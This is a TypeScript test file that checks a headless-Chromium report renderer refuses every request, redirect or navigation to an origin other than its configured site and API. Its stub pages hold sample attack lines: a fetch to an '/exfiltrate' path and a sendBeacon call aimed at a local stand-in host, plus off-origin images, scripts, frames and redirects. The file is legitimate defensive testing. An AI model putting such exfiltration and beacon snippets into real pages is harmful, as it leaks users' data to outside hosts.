// The renderer can't be steered to another origin (docs/security.md § Render
// tokens, "What the renderer can reach"). In production the renderer Lambda
// has open internet egress and holds a live render session, so the headless
// Chromium it drives must only ever talk to RENDER_SITE_URL and
// RENDER_API_URL, whatever the page asks for: a subresource, a fetch, a
// script navigation, or a redirect of the report route itself.
//
// Three local servers: the stub site, the stub API (the render-session
// exchange) and "elsewhere", which counts every request that reaches it. The
// positive control is a render that succeeds with the site and API both
// asked; every refusal must leave elsewhere untouched.
//
// Runs the real renderReportPdf with the Chromium from `pnpm test:e2e:install`.
// It needs no database, but lives in the db project (`.db.test.ts`) because
// CI's db-test job is where the Playwright Chromium is installed (the one
// vitest job that needs a browser anyway, for reports/render.db.test.ts); the
// unit job has none. Locally it skips (with a warning) without that browser;
// under CI a missing browser FAILS the file, so it can't pass by skipping
// (docs/testing.md § Tests that need a service or a browser).
import { existsSync } from 'node:fs';
import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http';
import type { AddressInfo } from 'node:net';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { RenderError, renderReportPdf, type RenderOptions } from './render.js';

const chromiumPath = await import('playwright-core').then(({ chromium }) => chromium.executablePath()).catch(() => '');
const haveChromium = !!chromiumPath && existsSync(chromiumPath);
if (!haveChromium && process.env.CI) {
	throw new Error(`render.origin.db.test.ts: no Playwright Chromium at ${chromiumPath || '(none)'} under CI; the job must install it (.github/workflows/ci.yml db-test)`);
}
if (!haveChromium) console.warn('render.origin.db.test.ts skipped: no Playwright Chromium (pnpm test:e2e:install)');

type Handler = (req: IncomingMessage, res: ServerResponse) => void;
const hits = { site: [] as string[], api: [] as string[], elsewhere: [] as string[] };
let sitePage: Handler = () => {};
const servers: Server[] = [];
const urls = { site: '', api: '', elsewhere: '' };

async function listen(name: keyof typeof hits, handler: Handler) {
	const s = createServer((req, res) => {
		hits[name].push(`${req.method} ${req.url}`);
		handler(req, res);
	});
	await new Promise<void>((resolve) => s.listen(0, '127.0.0.1', resolve));
	servers.push(s);
	// "localhost" for elsewhere: another host as well as another port.
	urls[name] = `http://${name === 'elsewhere' ? 'localhost' : '127.0.0.1'}:${(s.address() as AddressInfo).port}`;
}

const html = (res: ServerResponse, body: string) => {
	res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
	res.end(`<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Stub</title></head><body>${body}</body></html>`);
};
/** A report that is "ready" at once: what elsewhere serves, so a render that reaches it would print it. */
const readyPage = '<main data-report-ready="true"><h1>Elsewhere</h1></main>';

beforeAll(async () => {
	if (!haveChromium) return;
	await listen('site', (req, res) => sitePage(req, res));
	await listen('api', (req, res) => {
		res.writeHead(req.method === 'POST' && req.url === '/auth/render-session' ? 204 : 404, { 'access-control-allow-origin': urls.site, 'access-control-allow-credentials': 'true' });
		res.end();
	});
	await listen('elsewhere', (_req, res) => html(res, readyPage));
});

afterAll(async () => {
	await Promise.all(servers.map((s) => new Promise((r) => s.close(r))));
});

beforeEach(() => {
	for (const k of Object.keys(hits) as (keyof typeof hits)[]) hits[k].length = 0;
});

const LEFT = 'the report page tried to leave the site';
const target = { projectId: '00000000-0000-4000-8000-000000000002', runId: '00000000-0000-4000-8000-000000000003', token: 'A'.repeat(43) };
const options = (): RenderOptions => ({ siteUrl: urls.site, apiUrl: urls.api, timeoutMs: 20_000 });

describe.skipIf(!haveChromium)('the renderer stays on its configured site and API', () => {
	it('prints the report with every off-origin request refused: images, styles, scripts, fetches, frames (positive control: site and API asked)', async () => {
		sitePage = (_req, res) =>
			html(
				res,
				`<main class="page report"><h1>Report</h1>
				<img src="${urls.elsewhere}/beacon.png" alt="">
				<link rel="stylesheet" href="${urls.elsewhere}/style.css">
				<script src="${urls.elsewhere}/script.js"></script>
				<iframe src="${urls.elsewhere}/frame"></iframe>
				</main>
				<script>
				(async () => {
					const out = await fetch(${JSON.stringify(urls.elsewhere)} + '/exfiltrate?x=1', { mode: 'no-cors' }).then(() => 'reached', () => 'refused');
					const api = await fetch(${JSON.stringify(urls.api)} + '/runs', { credentials: 'include' }).then((r) => r.status, () => 0);
					navigator.sendBeacon(${JSON.stringify(urls.elsewhere)} + '/beacon');
					document.querySelector('h1').textContent = 'elsewhere ' + out + ', api ' + api;
					document.querySelector('main').setAttribute('data-report-ready', 'true');
				})();
				</script>`
			);
		const pdf = await renderReportPdf(target, options());
		expect(pdf.pages).toBeGreaterThan(0);
		// The document twice: the redirect walk (confineToOrigins), then the browser.
		expect(new Set(hits.site)).toEqual(new Set([`GET /projects/${target.projectId}/report?run=${target.runId}`]));
		expect(hits.api).toEqual(['POST /auth/render-session', 'GET /runs']);
		expect(hits.elsewhere).toEqual([]);
	});

	it('refuses a report route that redirects to another origin, without asking it', async () => {
		sitePage = (_req, res) => {
			res.writeHead(302, { location: `${urls.elsewhere}/projects/${target.projectId}/report` });
			res.end();
		};
		const err = await renderReportPdf(target, options()).catch((e: unknown) => e);
		expect(err).toEqual(new RenderError(LEFT));
		expect((err as RenderError).retry).toBe(false);
		expect((err as RenderError).message).not.toContain(urls.elsewhere);
		expect(hits.site.length).toBe(1);
		expect(hits.elsewhere).toEqual([]);
	});

	it('checks every hop of a redirect chain: one that leaves after a same-site hop is refused too', async () => {
		sitePage = (req, res) => {
			res.writeHead(302, { location: req.url!.startsWith('/hop') ? `${urls.elsewhere}/report` : '/hop' });
			res.end();
		};
		const err = await renderReportPdf(target, options()).catch((e: unknown) => e);
		expect(err).toEqual(new RenderError(LEFT));
		expect(hits.site).toEqual([`GET /projects/${target.projectId}/report?run=${target.runId}`, 'GET /hop']);
		expect(hits.elsewhere).toEqual([]);
	});

	it('refuses a page that navigates itself to another origin, without asking it', async () => {
		sitePage = (_req, res) =>
			html(
				res,
				`<main class="page report"><h1>Report</h1></main>
				<script>
				location.replace(${JSON.stringify(urls.elsewhere)} + '/projects/x/report');
				</script>`
			);
		const err = await renderReportPdf(target, options()).catch((e: unknown) => e);
		expect(err).toEqual(new RenderError(LEFT));
		expect(hits.site.length).toBeGreaterThan(0);
		expect(hits.elsewhere).toEqual([]);
	});

	it('follows a redirect that stays on the site (the report route may be served through one)', async () => {
		let n = 0;
		sitePage = (_req, res) => {
			if (n++ === 0) {
				res.writeHead(302, { location: `/projects/${target.projectId}/report/?run=${target.runId}` });
				res.end();
				return;
			}
			html(res, readyPage.replace('Elsewhere', 'Report'));
		};
		const pdf = await renderReportPdf(target, options());
		expect(pdf.pages).toBeGreaterThan(0);
		expect(hits.site.every((h) => h.startsWith(`GET /projects/${target.projectId}/report`))).toBe(true);
		expect(hits.elsewhere).toEqual([]);
	});
});
